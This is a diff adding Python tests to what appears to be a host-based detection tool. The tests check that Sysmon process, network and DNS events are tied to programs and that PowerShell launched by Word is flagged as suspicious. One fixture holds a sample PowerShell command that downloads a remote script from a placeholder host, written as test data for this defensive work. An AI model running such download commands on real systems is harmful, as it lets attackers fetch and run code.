@@ -519,3 +519,70 @@ def test_user_install_folder_still_needs_a_signature():
     path = "C:\\Users\\<user>\\AppData\\Local\\Programs\\app\\App.exe"
     r = assess([Owner(name="App.exe", path=path, signature="missing")], "other_program")
     assert r == ("unclear", ["App.exe is installed for one user, but isn't code-signed"])
+
+
+# ------------------------------------------------------------ Sysmon (Windows)
+
+def sysmon(eid, t, **cols):
+    utc = datetime.fromtimestamp(t, timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+    return {"name": "sysmon_events", "unixTime": T0 + 60, "action": "added",
+            "columns": {"eventid": str(eid), "utc": utc, **cols}}
+
+
+PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+GUID = "{aaaaaaaa-0000-0000-0000-000000000001}"
+
+
+def sysmon_log(tmp_path, parent="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"):
+    log = tmp_path / "osqueryd.results.log"
+    log.write_text("\n".join(json.dumps(r) for r in [
+        sysmon(1, T0 - 30, guid=GUID, path=PS, parent_path=parent,
+               cmdline="powershell -NoProfile -Command iwr https://dl.example/a.ps1 -Headers @{token='hunter2'}"),
+        sysmon(3, T0 + 1, guid=GUID, path=PS, remote_address=DST, remote_port="443"),
+        sysmon(22, T0, guid=GUID, path=PS, query="dl.example"),
+    ]))
+    return log
+
+
+def test_sysmon_ties_short_connections_and_dns_lookups_to_process_and_command_line(tmp_path):
+    idx = OwnerIndex()
+    idx.read_log(sysmon_log(tmp_path), since=0)
+    idx.resolve()
+    (conn_owner,) = idx.who(DST, 443, T0 + 2)          # a 1-second connection a snapshot would miss
+    (dns_owner,) = idx.who_dns("DL.example.", T0 + 5)
+    for o in (conn_owner, dns_owner):
+        assert o.name == "powershell.exe" and o.parent == "WINWORD.EXE"
+        assert "dl.example" in o.cmdline and "hunter2" not in o.cmdline   # redacted
+    assert idx.who(DST, 443, T0 + 600) == [] and idx.who_dns("dl.example", T0 + 600) == []
+
+
+def test_a_document_app_starting_a_shell_is_suspicious(tmp_path):
+    idx = OwnerIndex()
+    idx.read_log(sysmon_log(tmp_path), since=0)
+    idx.resolve()
+    assessment, signals = assess(idx.who(DST, 443, T0), "other_program")
+    assert assessment == "suspicious" and any("started by WINWORD.EXE" in s for s in signals)
+    idx = OwnerIndex()
+    idx.read_log(sysmon_log(tmp_path, parent="C:\\Windows\\explorer.exe"), since=0)
+    idx.resolve()
+    assert not any("started by" in s for s in assess(idx.who(DST, 443, T0), "other_program")[1])
+
+
+def test_collect_counts_dns_lookups_tied_to_a_program(tmp_path):
+    hc = HostContext(PC, None, [sysmon_log(tmp_path)], str(tmp_path / "t"), runner=FakeRunner([]))
+    dns_rows = [{"ts": T0, "id.orig_h": PC, "query": "dl.example", "answers": [DST]},
+                {"ts": T0, "id.orig_h": PC, "query": "nobody-asked.example"}]
+    facts = hc.collect(case(indicators=[]), [], dns_rows, now=T0 + 3600)
+    assert (facts["host_lookups"], facts["host_lookups_matched"]) == (2, 1)
+    assert facts["host_programs"] == ["powershell.exe"] and facts["host_assessment"] == "suspicious"
+
+
+def test_pseudo_processes_are_not_listed_as_programs(tmp_path):
+    log = tmp_path / "osqueryd.results.log"
+    rows = [{"name": "outbound_connections", "unixTime": T0, "action": "added",
+             "columns": {"name": n, "path": p, "remote_address": DST, "remote_port": "443", "pid": "4"}}
+            for n, p in (("[System Process]", ""), ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\chrome.exe"))]
+    log.write_text("\n".join(json.dumps(r) for r in rows))
+    hc = HostContext(PC, None, [log], str(tmp_path / "t"), runner=FakeRunner([]))
+    facts = hc.collect(case(indicators=[]), [out_conn(T0)], [], now=T0 + 3600)
+    assert facts["host_programs"] == ["chrome.exe"]
